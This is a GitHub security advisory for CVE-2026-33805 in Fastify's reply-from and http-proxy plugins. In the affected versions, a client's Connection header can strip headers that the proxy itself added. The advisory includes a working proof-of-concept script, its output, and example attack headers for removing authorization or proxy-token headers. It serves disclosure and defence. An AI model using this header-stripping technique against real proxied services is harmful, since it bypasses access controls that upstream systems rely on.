# [C] Fastify's connection header abuse enables stripping of proxy-added headers

## Summary
Severity: Critical
Advisory: GHSA-gwhp-pf74-vj37
CVE: CVE-2026-33805
CWE: CWE-644
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:N (CVSS_V3)
Published: 2026-04-16
Source: https://github.com/advisories/GHSA-gwhp-pf74-vj37
Type: github-advisory

## Affected
- npm: `@fastify/reply-from` — affected >=0 <12.6.2
- npm: `@fastify/http-proxy` — affected >=0 <11.4.4

## Details
### Summary

`@fastify/reply-from` and `@fastify/http-proxy` process the client's `Connection` header after the proxy has added its own headers via `rewriteRequestHeaders`. This allows attackers to retroactively strip proxy-added headers (like access control or identification headers) from upstream requests by listing them in the `Connection` header value. This affects applications using these plugins with custom header injection for routing, access control, or security purposes.

### Details

The vulnerability exists in `@fastify/reply-from/lib/request.js` at lines 128-136 (HTTP/1.1 handler) and lines 191-200 (undici handler). The processing flow is:

1. Client headers are copied including the `connection` header (`@fastify/reply-from/index.js` line 91)
2. The proxy adds custom headers via `rewriteRequestHeaders` (line 151)
3. During request construction, the transport handlers read the client's `Connection` header and strip any headers listed in it
4. This stripping happens after `rewriteRequestHeaders`, allowing clients to target proxy-added headers for removal

RFC 7230 Section 6.1 Connection header processing is intended for proxies to strip hop-by-hop headers from incoming requests before adding their own headers. The current implementation reverses this order, processing the client's Connection header after the proxy has already modified the header set.

The call chain:
1. `@fastify/reply-from/index.js` line 91: `headers = { ...req.headers }` — copies ALL client headers including `connection`
2. `index.js` line 151: `requestHeaders = rewriteRequestHeaders(this.request, headers)` — proxy adds custom headers (e.g., `x-forwarded-by`)
3. `index.js` line 180: `requestImpl({...headers: requestHeaders...})` — passes headers to transport
4. `request.js` line 191 (undici): `getConnectionHeaders(req.headers)` — reads Connection header FROM THE CLIENT
5. `request.js` lines 198-200: Strips headers listed in Connection — including proxy-added headers

This is distinct from the general hop-by-hop forwarding concern — it's specifically about the client controlling which headers get stripped from the upstream request via the Connection header, subverting the proxy's `rewriteRequestHeaders` function.

### PoC

Self-contained reproduction with an upstream echo service and a proxy that adds a custom header:

```javascript
const fastify = require('fastify');

async function test() {
  // Upstream service that echoes headers
  const upstream = fastify({ logger: false });
  upstream.get('/api/echo-headers', async (request) => {
    return { headers: request.headers };
  });
  await upstream.listen({ port: 19801 });

  // Proxy that adds a custom header via rewriteRequestHeaders
  const proxy = fastify({ logger: false });
  await proxy.register(require('@fastify/reply-from'), {
    base: 'http://localhost:19801'
  });

  proxy.get('/proxy/*', async (request, reply) => {
    const target = '/' + (request.params['*'] || '');
    return reply.from(target, {
      rewriteRequestHeaders: (originalReq, headers) => {
        return { ...headers, 'x-forwarded-by': 'fastify-proxy' };
      }
    });
  });

  await proxy.listen({ port: 19800 });

  // Baseline: proxy adds x-forwarded-by header
  const res1 = await proxy.inject({
    method: 'GET',
    url: '/proxy/api/echo-headers'
  });
  console.log('Baseline response headers from upstream:');
  const body1 = JSON.parse(res1.body);
  console.log('  x-forwarded-by:', body1.headers['x-forwarded-by'] || 'NOT PRESENT');

  // Attack: Connection header strips the proxy-added header
  const res2 = await proxy.inject({
    method: 'GET',
    url: '/proxy/api/echo-headers',
    headers: { 'connection': 'x-forwarded-by' }
  });
  console.log('\nAttack response headers from upstream:');
  const body2 = JSON.parse(res2.body);
  console.log('  x-forwarded-by:', body2.headers['x-forwarded-by'] || 'NOT PRESENT (stripped!)');

  await proxy.close();
  await upstream.close();
}
test();
```

Actual output:
```
Baseline response headers from upstream:
  x-forwarded-by: fastify-proxy

Attack response headers from upstream:
  x-forwarded-by: NOT PRESENT (stripped!)
```

The `x-forwarded-by` header that the proxy explicitly added in `rewriteRequestHeaders` is stripped before reaching the upstream.

Multiple headers can be stripped at once by sending `Connection: x-forwarded-by, x-forwarded-for`.

Both the undici (default) and HTTP/1.1 transport handlers in `@fastify/reply-from` are affected, as well as `@fastify/http-proxy` which delegates to `@fastify/reply-from`.

### Impact

Attackers can selectively remove any header added by the proxy's `rewriteRequestHeaders` function. This enables several attack scenarios:

1. **Bypass proxy identification**: Strip headers that identify requests as coming through the proxy, potentially bypassing upstream controls that differentiate between direct and proxied requests
2. **Circumvent access control**: If the proxy adds headers used for routing, authorization, or security decisions (e.g., `x-internal-auth`, `x-proxy-token`), attackers can strip them to access unauthorized resources
3. **Remove arbitrary headers**: Any header can be targeted, including `Connection: authorization` to strip authentication or `Connection: x-forwarded-for, x-forwarded-by` to remove multiple headers at once

This vulnerability affects deployments where the proxy adds security-relevant headers that downstream services rely on for access control decisions. It undermines the security model where proxies act as trusted intermediaries adding authentication or routing signals.

### Affected Versions

- `@fastify/reply-from` — All versions, both undici (default) and HTTP/1.1 transport handlers
- `@fastify/http-proxy` — All versions (delegates to `@fastify/reply-from`)
- Any configuration using `rewriteRequestHeaders` to add headers that could be security-relevant
- No special configuration required to exploit — works with default settings

### Suggested Fix

The Connection header from the client should be processed and consumed before `rewriteRequestHeaders` is called, not after. Alternatively, the Connection header processing in `request.js` should maintain a list of headers that existed in the original client request and only strip those, not headers added by `rewriteRequestHeaders`.

## References
- https://github.com/fastify/fastify-reply-from/security/advisories/GHSA-gwhp-pf74-vj37
- https://nvd.nist.gov/vuln/detail/CVE-2026-33805
- https://cna.openjsf.org/security-advisories.html
- https://github.com/fastify/fastify-reply-from
